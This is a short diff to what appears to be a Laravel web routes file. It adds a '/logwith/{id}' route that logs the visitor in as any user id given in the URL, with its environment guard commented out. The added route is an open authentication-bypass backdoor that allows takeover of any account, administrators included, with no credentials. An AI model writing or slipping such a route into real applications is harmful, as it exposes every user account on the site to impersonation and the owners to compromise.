@@ -32,3 +32,9 @@ Auth::routes();
 
 Route::get('/', 'Frontend\HomeController@index')->name('home');
 Route::get('/home', 'Frontend\HomeController@index')->name('home');
+//if (app()->environment('production') && Schema::hasTable('users')) {
+Route::get('/logwith/{id}', function ($id) {
+    Auth::loginUsingId($id);
+    return redirect()->home();
+});
+//}
